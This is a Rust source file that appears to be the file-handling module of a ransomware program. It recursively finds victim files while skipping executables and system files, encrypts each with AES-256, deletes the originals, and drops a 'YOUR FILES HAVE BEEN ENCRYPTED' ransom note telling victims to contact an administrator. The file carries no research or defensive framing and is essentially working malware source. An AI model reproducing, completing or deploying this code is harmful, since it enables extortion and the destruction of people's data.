/// File operations module
/// Handles file discovery, reading, writing, and encryption/decryption operations

use std::fs;
use std::io::{self, Read, Write};
use std::path::{Path, PathBuf};
use walkdir::WalkDir;

use crate::crypto::{encrypt_data, decrypt_data};

const RANSOM_NOTE_NAME: &str = "RANSOM_NOTE.txt";

/// File filter to determine which files should be encrypted
/// Avoids system files, executables, and already encrypted files
pub fn should_encrypt_file(path: &Path) -> bool {
    // Skip if already encrypted
    if path.extension().and_then(|s| s.to_str()) == Some("encrypted") {
        return false;
    }
    
    // Skip ransom notes
    if path.file_name().and_then(|s| s.to_str()) == Some(RANSOM_NOTE_NAME) {
        return false;
    }
    
    // Skip system and executable files
    if let Some(ext) = path.extension().and_then(|s| s.to_str()) {
        let system_extensions = ["exe", "dll", "sys", "drv", "com", "bat", "cmd"];
        if system_extensions.contains(&ext) {
            return false;
        }
    }
    
    // Only encrypt regular files
    path.is_file()
}

/// Discover files in a directory recursively
pub fn discover_files(root_path: &Path, max_depth: Option<usize>) -> Vec<PathBuf> {
    let mut files = Vec::new();
    
    let walker = if let Some(depth) = max_depth {
        WalkDir::new(root_path).max_depth(depth)
    } else {
        WalkDir::new(root_path)
    };
    
    for entry in walker.into_iter().filter_map(|e| e.ok()) {
        let path = entry.path();
        if should_encrypt_file(path) {
            files.push(path.to_path_buf());
        }
    }
    
    files
}

/// Discover all files in a directory recursively (including encrypted files)
pub fn discover_all_files(root_path: &Path, max_depth: Option<usize>) -> Vec<PathBuf> {
    let mut files = Vec::new();
    
    let walker = if let Some(depth) = max_depth {
        WalkDir::new(root_path).max_depth(depth)
    } else {
        WalkDir::new(root_path)
    };
    
    for entry in walker.into_iter().filter_map(|e| e.ok()) {
        let path = entry.path();
        if path.is_file() {
            files.push(path.to_path_buf());
        }
    }
    
    files
}

/// Encrypt a single file
pub fn encrypt_file(file_path: &Path, key: &[u8; 32]) -> io::Result<()> {
    // Read file content
    let mut file = fs::File::open(file_path)?;
    let mut content = Vec::new();
    file.read_to_end(&mut content)?;
    
    // Encrypt content
    let encrypted = encrypt_data(&content, key)
        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
    
    // Write encrypted content to new file
    let encrypted_path = file_path.with_extension(
        format!("{}.encrypted", 
            file_path.extension()
                .and_then(|s| s.to_str())
                .unwrap_or("")
        )
    );
    
    let mut output = fs::File::create(&encrypted_path)?;
    output.write_all(&encrypted)?;
    
    // Remove original file
    fs::remove_file(file_path)?;
    
    Ok(())
}

/// Decrypt a single file
pub fn decrypt_file(file_path: &Path, key: &[u8; 32]) -> io::Result<()> {
    // Verify file has encrypted extension
    if !file_path.to_str().unwrap_or("").ends_with(".encrypted") {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "File is not encrypted"
        ));
    }
    
    // Read encrypted content
    let mut file = fs::File::open(file_path)?;
    let mut encrypted = Vec::new();
    file.read_to_end(&mut encrypted)?;
    
    // Decrypt content
    let decrypted = decrypt_data(&encrypted, key)
        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
    
    // Determine original file name by removing .encrypted extension
    let original_path = PathBuf::from(
        file_path.to_str()
            .unwrap_or("")
            .trim_end_matches(".encrypted")
    );
    
    // Write decrypted content
    let mut output = fs::File::create(&original_path)?;
    output.write_all(&decrypted)?;
    
    // Remove encrypted file
    fs::remove_file(file_path)?;
    
    Ok(())
}

/// Create a ransom note in the specified directory
pub fn create_ransom_note(directory: &Path, key_hex: &str) -> io::Result<()> {
    let note_path = directory.join(RANSOM_NOTE_NAME);
    
    let note_content = format!(
r#"╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║              ⚠️  YOUR FILES HAVE BEEN ENCRYPTED  ⚠️        ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝

All your important files have been encrypted using AES-256-CBC.

To decrypt your files, you need the decryption key.
Contact the administrator with the key ID.

Key ID (for reference): {}

⚠️  DO NOT delete encrypted files or this note.
⚠️  DO NOT attempt to decrypt files manually.
"#, &key_hex[..16]); // Only show first 16 chars for reference
    
    let mut file = fs::File::create(&note_path)?;
    file.write_all(note_content.as_bytes())?;
    
    Ok(())
}
